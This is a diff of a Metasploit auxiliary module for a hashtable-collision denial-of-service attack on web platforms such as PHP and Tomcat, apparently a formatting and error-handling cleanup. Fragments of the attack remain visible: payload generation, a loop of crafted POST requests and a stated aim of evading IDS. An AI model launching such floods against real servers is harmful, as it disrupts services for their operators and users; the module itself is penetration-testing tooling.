@@ -20,37 +20,43 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'          => 'Hashtable Collisions',
 			'Description'   => %q{
-									A variety of programming languages suffer from a denial-of-service (DoS) condition against storage functions
-									of key/value pairs in hash data structures, the condition can be leveraged by exploiting predictable collisions
-									in the underlying hashing algorithms.
-									The issue finds particular exposure in web server applications and/or frameworks. In particular, the lack of
-									sufficient limits for the number of parameters in POST requests in conjunction with the predictable collision
-									properties in the hashing functions of the underlying languages can render web applications vulnerable to the
-									DoS condition. The attacker, using specially crafted HTTP requests, can lead to a 100% of CPU usage which can
-									last up to several hours depending on the targeted application and server performance, the amplification
-									effect is considerable and requires little bandwidth and time on the attacker side.
+				A variety of programming languages suffer from a denial-of-service (DoS) condition
+				against storage functions of key/value pairs in hash data structures, the
+				condition can be leveraged by exploiting predictable collisions in the underlying
+				hashing algorithms.
 
-									Tested with PHP + httpd, Tomcat, Glassfish, Geronimo. Generates a random Payload to bypass IDS.
+				The issue finds particular exposure in web server applications and/or frameworks.
+				In particular, the lack of sufficient limits for the number of parameters in POST
+				requests in conjunction with the predictable collision properties in the hashing
+				functions of the underlying languages can render web applications vulnerable to the
+				DoS condition. The attacker, using specially crafted HTTP requests, can lead to a
+				100% of CPU usage which can last up to several hours depending on the targeted
+				application and server performance, the amplification effect is considerable and
+				requires little bandwidth and time on the attacker side.
+
+				Tested with PHP + httpd, Tomcat, Glassfish, Geronimo. Generates a random Payload
+				to bypass IDS.
 			},
 			'Author'        =>
-			[
-				'Christian Mehlmauer <FireFart[at]gmail.com>'
-			],
+				[
+					'Christian Mehlmauer <FireFart[at]gmail.com>'
+				],
 			'License'       => MSF_LICENSE,
 			'Version'       => '$Revision$',
 			'References'    =>
-			[
-				['URL', 'http://www.ocert.org/advisories/ocert-2011-003.html'],
-				['URL', 'http://www.nruns.com/_downloads/advisory28122011.pdf'],
-				['URL', 'http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html'],
-				['URL', 'http://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf'],
-				['URL', 'http://www.youtube.com/watch?v=R2Cq3CLI6H8'],
-				['CVE', '2011-5034'],
-				['CVE', '2011-5035'],
-				['CVE', '2011-4885'],
-				['CVE', '2011-4858']
-			],
-			'DisclosureDate'=> 'Dec 28 2011'))
+				[
+					['URL', 'http://www.ocert.org/advisories/ocert-2011-003.html'],
+					['URL', 'http://www.nruns.com/_downloads/advisory28122011.pdf'],
+					['URL', 'http://events.ccc.de/congress/2011/Fahrplan/events/4680.en.html'],
+					['URL', 'http://events.ccc.de/congress/2011/Fahrplan/attachments/2007_28C3_Effective_DoS_on_web_application_platforms.pdf'],
+					['URL', 'http://www.youtube.com/watch?v=R2Cq3CLI6H8'],
+					['CVE', '2011-5034'],
+					['CVE', '2011-5035'],
+					['CVE', '2011-4885'],
+					['CVE', '2011-4858']
+				],
+			'DisclosureDate'=> 'Dec 28 2011'
+		))
 
 		register_options(
 		[
@@ -77,6 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 		@recursivecounter = 1
 		collisionchars = compute_collision_chars
 		return nil if collisionchars == nil
+
 		length = datastore['payloadlength']
 		size = collisionchars.length
 		post = ""
@@ -179,8 +186,7 @@ class Metasploit3 < Msf::Auxiliary
 					datastore['maxpayloadsize'] = 2
 				end
 			else
-				print_error("Target #{datastore['TARGET']} not supportec")
-				exit
+				raise RuntimeError, "Target #{datastore['TARGET']} not supported"
 		end
 
 		print_status("Generating Payload...")
@@ -195,11 +201,11 @@ class Metasploit3 < Msf::Auxiliary
 		print_status("Payload generated")
 
 		for x in 1..datastore['RLIMIT']
-			print_status("sending Request ##{x}...")
+			print_status("Sending Request ##{x}...")
 			opts = {
-				'method'	=>	'POST',
-				'uri'		=>	datastore['URL'],
-				'data'		=>	payload
+				'method'	=> 'POST',
+				'uri'		=> datastore['URL'],
+				'data'		=> payload
 			}
 			c = connect
 			r = c.request_cgi(opts)
